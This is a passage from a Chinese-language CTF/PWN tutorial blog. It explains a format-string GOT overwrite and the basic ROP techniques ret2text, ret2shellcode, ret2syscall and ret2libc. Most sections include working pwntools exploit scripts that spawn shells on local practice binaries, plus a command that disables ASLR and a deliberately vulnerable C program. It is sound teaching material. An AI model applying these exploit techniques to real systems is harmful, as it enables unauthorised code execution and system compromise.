title="覆盖puts函数"></a>覆盖puts函数</h6><p>前面已经用过了puts_file和get_file函数，接下来使用show_dir函数<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212173601.png" alt="Pasted image 20250212173601"><br>基本思路是这样的：<br>回顾一下show_dir函数，这个函数会将我们输入的文件名存放在变量s中，最后会作为puts函数的参数打印出来。<strong>那么如果将puts函数替换成system函数，并且我们创建一个叫”/bin/sh”的文件名，那么原本应该执行的是puts(s)，但实际上执行的却是system(“/bin/sh”)</strong><br>那么覆盖的过程依然利用格式化字符串进行覆盖，这里介绍一下pwntools中的一个函数<br><code>fmtstr_payload</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212181148.png" alt="Pasted image 20250212181148"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>7:距离格式化字符串的偏移<br>puts_got:被覆盖的地址<br>sys_addr:覆盖的地址</p></blockquote><h6 id="执行dir后getshell"><a href="#执行dir后getshell" class="headerlink" title="执行dir后getshell"></a>执行dir后getshell</h6><p>覆盖后输入dir调用show_dir函数，原本的puts(“/bin/sh;”)就会转而执行system(“/bin/sh;”),然后即可getshell</p><h5 id="回顾思路"><a href="#回顾思路" class="headerlink" title="回顾思路"></a>回顾思路</h5><p>输入密码—&gt;输入put创建文件—&gt;输入文件名”/bin/sh;”—&gt;输入文件内容（覆盖的payload)-&gt;输入get打印文件内容—&gt;输入要打印的文件名”/bin/sh;“执行覆盖</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>   </span><br><span class="line">sh=process(<span class="string">&#x27;./pwn3&#x27;</span>)    </span><br><span class="line">pwn3=ELF(<span class="string">&#x27;./pwn3&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#登录密码</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;nism):&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of puts</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">put_addr= u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_got-&gt;system</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在运行show_dir时将puts变为system</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get执行printf，令payload执行成功</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过dir开shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong><em>getshell</em></strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212204303.png" alt="Pasted image 20250212204303"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门-基本ROP</title>
      <link href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP</p><h3 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。<strong>通过上一篇文章栈溢出漏洞原理详解与利用，我们可以发现栈溢出的控制点是ret处</strong>，<em>那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</em></p><h3 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a>为什么要ROP</h3><p>探究原因之前，我们先看一下什么是NX(DEP)，<em>NX即No-execute(不可执行)的意思，NX(DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</em><br><strong>随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。</strong><br>所以就有了各种绕过办法，rop就是一种。</p><p>ROP(Return Oriented Programming)，<strong><em>其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。</em></strong><br><em>所谓gadgets就是以ret结尾的指令序列</em>，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。<br><strong>ROP攻击一般得满足如下条件</strong></p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的gadgets以及相应gadgets的地址。<br>如果gadgets每次的地址是不固定的，那我们就需要想办法动态获取对应的地址。</li></ul><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong><em>ret2text即控制程序执行程序本身已有的的代码(.text)</em></strong><br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的ROP。<br>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><blockquote><p><strong>顾名思义，ret2text(ret to text)，也就是说我们的利用点在原文件中寻找相对应的代码即可(进程存在危险函数如system(“/bin”)或execv(“/bin/sh”)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。），控制程序执行程序本身已有的的代码（.text)</strong></p></blockquote><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>开启了NX，栈上无法写入shellcode</p><blockquote><p><strong>shellcode包含system(“/bin/sh”)等，当NX保护开启，就表示题目给了你system(‘/bin/sh’），如果关闭，表示你需要自己去构造shellcode</strong></p></blockquote><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下文件保护<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110045.png" alt="Pasted image 20250122110045">保护全关<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111413.png" alt="Pasted image 20250122111413"><br>r代表main函数的栈底，紧接着就是返回地址，<code>offset=0x8-(-0x20)=40</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110827.png" alt="Pasted image 20250122110827"><br>test函数,即后门函数地址为<code>0x401132</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111722.png" alt="Pasted image 20250122111722"><br>写以下exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x401132</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123145.png" alt="Pasted image 20250122123145"><br>结果本地打不通，一开始以为是offset测量错误，于是去学习了测量变量溢出长度(cyclic)，手动测出来还是40，最后猜测是地址问题，在ida中找到”/bin/sh”，修改addr为<code>0x401136</code>。</p><p><em>最后了解到但如果操作系统是 <strong>Ubuntu 18.04</strong> 及之后的版本，就不得不考虑 <strong>栈对齐</strong> 的问题。</em></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122122225.png" alt="Pasted image 20250122122225"></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123204.png" alt="Pasted image 20250122123204"><br><strong><em>成功getshell</em></strong></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><strong><em>ret2shellcode，即控制程序执行 shellcode 代码</em></strong>。<br><strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p><blockquote><p>即程序中没有类似于system(“/bin/sh)后门函数，需要自己填充</p></blockquote><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h3 id="利用关键"><a href="#利用关键" class="headerlink" title="利用关键"></a>利用关键</h3><ul><li>程序存在溢出，并且还要能够控制返回地址</li><li>程序运行时，shellcode所在的区域要拥有执行权限(NX保护关闭，bss段可执行)</li><li>操作系统还需要关闭ASLR(地址空间布局随机化)保护。(或关闭PIE保护)</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><ul><li>先使用cyclic测试溢出点，构造初步的payload</li><li>确定程序中的溢出位，看是否可在bss段传入数据</li><li>使用GDB的<code>vmmap</code>查看<code>bss段</code></li><li>再将程序溢出到上一步用户提交的变量的地址</li></ul><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example">ctf-challenges/pwn/stackoverflow/ret2shellcode/ret2shellcode-example at master · ctf-wiki/ctf-challenges</a><br>运行<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130739.png" alt="Pasted image 20250123130739"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130542.png" alt="Pasted image 20250123130542"><br>IDA打开<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130924.png" alt="Pasted image 20250123130924"><br>可以看到，无后门函数且存在基本的栈溢出漏洞，且将对应字符串复制到buf2处</p><blockquote><p>可用<code>readelf -S 文件名</code>提供程序中各段的地址范围<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131052.png" alt="Pasted image 20250123131052"><br>buf2在bss段，动调看该bss段是否可执行<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131416.png" alt="Pasted image 20250123131416"><br>bss段在以下范围，无可执行权限(ubuntu24)<br><code>0x804a000  0x804b000 rw-p     1000   1000 /home/zechariah/桌面/pwn_learn/ret2shellcode</code></p></blockquote><p>在较低版本的kali或linux中,则是<br><code>rwxp</code>，具有可执行权限<br>接着用cyclic计算偏移为112<br>得到如下exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成并汇编shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br>注意一下payload: <code>shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr)</code><br>首先我们将payload输入到变量s也就是栈上，然后将main函数的返回地址覆盖为buf2_addr（<em>需要此bss段可执行</em>)，之后main函数执行strncpy(buf2,&amp;s,100u);（虽然shellcode被截断为100，但是被截断的内容只是A，并不影响shellcode的完整度），将内容复制到了buf2，<strong>由于main函数的返回地址被覆盖为shellcode的地址，因此在main函数执行完毕之后，ElP转向执行shellcode</strong></p><p><strong><em>bss段可执行时，可成功getshell</em></strong></p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><strong>ret2syscall</strong></h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p><strong><em>ret to syscall，就是调用系统函数以达到getshell的目的</em></strong><br>在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供<br>了进程与操作系统之间的基本接口。<br>至于系统调用在其中充当什么角色，稍后再看，现在我们要做的是：让程序调用execve(“/bin/sh”,NULL,NULL)函数即可拿到shell</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>汇编层面调用shell</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax, <span class="number">0xb</span></span><br><span class="line">mov ebx, [<span class="string">&quot;/bin/sh&quot;</span>]  ;[<span class="string">&quot;/bin/sh&quot;</span>]表示存放字符串<span class="string">&quot;/bin/sh&quot;</span>的地址</span><br><span class="line">mov ecx, <span class="number">0</span></span><br><span class="line">mov edx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>调用此函数的具体的步骤是这样的：因为<strong>该程序是32位</strong>，所以：</p><ul><li><code>eax</code> 应该为 <code>0xb</code></li><li><code>ebx</code>应该指向<code>/bin/sh</code>的地址，其实执行<code>sh</code>的地址也可以</li><li><code>ecx</code>应该为<code>0</code></li><li><code>edx</code>应该为<code>0</code></li><li>最后再执行<code>int 0x80</code>触发中断即可执行<code>execve()</code>获取shell<br>系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们再执行int0x80就可执行对应的系统调用。<h3 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h3></li><li>存在栈溢出<h3 id="如何控制这些寄存器的值？"><a href="#如何控制这些寄存器的值？" class="headerlink" title="如何控制这些寄存器的值？"></a>如何控制这些寄存器的值？</h3>在我们最开始学习汇编函数的时候，我们最常用到的就是push，pop，ret指令，而这一次我们将使用pop和ret的组合来控制寄存器的值以及执行方向。<blockquote><p>例如：在一个栈上，<em>假设栈顶的值为2，当我们pop eax,时，2就会存进eax寄存器</em>。同样的，我们可以用同样的方法完成execve()函数参数的控制</p></blockquote></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop eax #系统调用号载入，execve为<span class="number">0xb</span></span><br><span class="line">pop ebx #/bin/shd的<span class="built_in">string</span></span><br><span class="line">pop ecx #第二个参数，<span class="number">0</span></span><br><span class="line">pop edx #第三个参数，<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这样寄存器的值可以控制了。然后使用gadgets让这一连串的pop命令顺序连接执行，最后使用的ret指令，进而控制程序执行流程。</p><blockquote><p>简单的理解，gadgets就是程序中的小碎片，ret2syscall就是利用这些小碎片来拼成shell，使用int 0x80系统中断来执行execve()，从而达成控制系统的目的。</p></blockquote><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall">ctf-challenges/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall at master · ctf-wiki/ctf-challenges</a><br>运行<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185858.png" alt="Pasted image 20250123185858"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185747.png" alt="Pasted image 20250123185747"><br>32位程序，开了NX保护<br>当NX保护开启，就表示题目给了你全部<code>system(&#39;/bin/sh&#39;）</code>或部分<code>&#39;/bin/sh&#39;</code>，如果关闭，表示你需要自己去构造shellcode(ret2shellcode)<br>IDA<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123190238.png" alt="Pasted image 20250123190238"><br>既然开了NX保护，我们就不能使用<strong>ret2shellcode</strong>，没有system函数，也无法使用<strong>ret2text</strong>，我们使用一种全新的方法：<strong>ret2syscall</strong>。<br>从IDA可以看到：程序仍然使用了gets函数，存在栈溢出的条件。<br>很容易测得我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自已填写代码来获得shell（开了NX保护，栈上的代码无法执行)，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。</p><p>在前面介绍过，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行<code>int 0x80</code>就可执行对应的系统调用。比如说这里我们利用execve(<strong>“/bin/sh”</strong>,<em>NULL</em>,<em>NULL</em>)系统调用来获取shell。<br>其中，该<strong>程序是32位</strong>，所以我们需要使得</p><ul><li>系统调用号，即<code>eax</code>应该为<code>0xb</code></li><li>第一个参数，即<code>ebx</code>应该指向<code>/bin/sh</code>的地址，其实执行<code>sh</code>的地址也可以。</li><li>第二个参数，即<code>ecx</code>应该为<code>0</code></li><li>第三个参数，即<code>edx</code>应该为<code>0</code><br>而我们如何控制这些寄存器的值呢？这里就需要使用gadgets。具体寻找gadgets<br>的方法，我们可以使用ropgadgets这个工具。</li><li>首先，我们来寻找控制eax的gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193603.png" alt="Pasted image 20250123193603"></li><li>寻找控制其他寄存器的gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193810.png" alt="Pasted image 20250123193810"></li><li>获得/bin/sh字符串对应的地址<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193957.png" alt="Pasted image 20250123193957"></li><li>获得int 0x80的地址<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194016.png" alt="Pasted image 20250123194016"><h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194802.png" alt="Pasted image 20250123194802"></p><blockquote><p>上图下方为高地址</p></blockquote><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>ret2libc这种攻击方式主要是针对<em>动态链接(Dynamic linking)</em> [[1-6 动态链接&amp;PLT表&amp;GOT表]]编译的程序，因为正常情况下是无法在程序中找到像<strong>system()、execve()</strong> 这种系统级函数。<br>因为程序是动态链接生成的，所以在程序运行时会调用<strong>libc.so</strong>（<em>程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间</em>，<strong>libc.so</strong>就是其中最基本的一个)，<strong>libc.so</strong>是linux下C语言库中的运行库<strong>glibc</strong>的动态链接版，并且<strong>libc.so</strong>中包含了大量的可以利用的函数，包括<strong>system()、execve()</strong> 等系统级函数，<em>我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权</em>。通常情况下，我们会选择执行<strong>system(“/bin/sh”)</strong> 来打开shell，如此就只剩下两个问题：</p><blockquote><p>1.找到system)函数的地址;<br>2.在内存中找到”/bin/sh”这个字符串的地址。</p><h3 id="利用前提-1"><a href="#利用前提-1" class="headerlink" title="利用前提"></a>利用前提</h3><p>r2libc技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的no stack executable限制<br>(<strong>所以后续实验还是需要关闭系统的ASLR，以及堆栈保护</strong>)<br>比如PaX和ExecShield安全策略。该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到libc库中的某个库函数(如，system等)，而不是直接定位到shellcode。然后通过在栈中精心构造该库函数的参数，以便达到类似于执行shellcode的目的。</p></blockquote><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141109.png" alt="Pasted image 20250125141109"></p><blockquote><p>Saved EIP指保存call指令下一条指令的地址</p></blockquote><p>1) 使用libc库中system函数的地址覆盖掉原本的返回地址；这样原函数返回的时候会转而调用system函数。获取system函数的返回地址很简单，只需要使用gdb调试目标程序，在main函数下断点，程序运行中断在断点处后，使用<code>p system</code>命令即可:</p><blockquote><p>该方法可以获取任意libc函数的地址。<br>2) 设置system函数返回后的地址，以及为system函数构造我们预定的参数。</p></blockquote><p>难点主要在第2步中system函数相关的栈帧结构的安排上，比如为什么Filler就是Return Address After system，为什么传递给system的参数紧跟在Fillter之后？这就涉及到函数的调用规则。我们知道<strong>函数调用在汇编中通过call指令实现，而函数返回则通过ret指令实现</strong>。Call指令可以实现多种方式的函数跳转，这里为了简便，暂且只考虑跳转地址在内存中的call指令的实现</p><p>CPU在执行call指令时需要进行两步操作：</p><ol><li>将当前的IP(也就是函数返回地址)入栈，即：<code>push IP</code>;</li><li>跳转，即： <code>jmp dword ptr 内存单元地址</code>。</li></ol><p>CPU在执行ret指令时只需要恢复IP寄存器即可，因此ret指令相当于<code>pop IP</code>。<br>因此对于正常函数调用而言，其栈帧结构如下图所示：<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141603.png" alt="Pasted image 20250125141603"><br>但是由于我们使用system的函数地址替换了原本的IP寄存器，强制执行system函数，破坏了原程序的栈帧分配和释放策略，所以后续的操作必须基于这个被破坏的栈帧结构实现。</p><h4 id="为何Filler是函数的返回地址"><a href="#为何Filler是函数的返回地址" class="headerlink" title="为何Filler是函数的返回地址"></a>为何Filler是函数的返回地址</h4><p>这需要我们查看system函数的汇编实现。通过 gdb调试得到如下信息：<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141829.png" alt="Pasted image 20250125141829"><br>正常情况下，我们是通过call指令进行函数调用的，因此在进入到system函数之前，call指令已经通过push IP将其返回地址push到栈帧中了，所以在正常情况下ret指令pop到 IP的数据就是之前call指令push到栈帧的数据，也就是说两者是成对的。但是在我们的漏洞利用中，直接通过覆盖IP地址跳转到了system函数，而并没有经过call调用，也即是没有push IP的操作，但是system函数却照常进行了ret指令的pop IP操作。那么这个ret指令pop到IP的是哪一处地址的数据呢？答案就是Filler!<br>在程序执行到图中的Saved EIP(即system函数地址)的时候，此时的ESP指向了Filler，然后就转而执行system函数。通过分析system函数的汇编实现可以看出：该函数中对ESP的操作都是成对出现的，如<code>push %ebx</code>与<code>pop %ebx</code>等。所以当执行到ret指令时，ESP还是指向Filler，也就是说ret指令内涵的pop IP操作就是将Filler的数据pop到IP寄存器中！</p><h4 id="为何传递给system的参数紧跟在Filler之后"><a href="#为何传递给system的参数紧跟在Filler之后" class="headerlink" title="为何传递给system的参数紧跟在Filler之后"></a>为何传递给system的参数紧跟在Filler之后</h4><p>在正常的函数调用中，其栈帧分布如图1-2所示，但是在此漏洞利用中，由于我们强制更改了调用过程，省去了call调用的push IP步骤，因此就造成了<strong>Filler变成了EIP</strong>。但是，需要注意的是，我们也仅仅是省去了push IP这一步而已，其他步骤与正常函数调用并无区别，所以如果我们将Filler看做是保存的返回地址EIP的话，那么它“<strong>之后(相对栈增长方向而言)</strong>”的数据就自然而然变成了system函数的参数了。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p>记得关ASLR<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">```C</span><br><span class="line">#undef _FORTIFY_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">char buf[128];</span><br><span class="line">read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 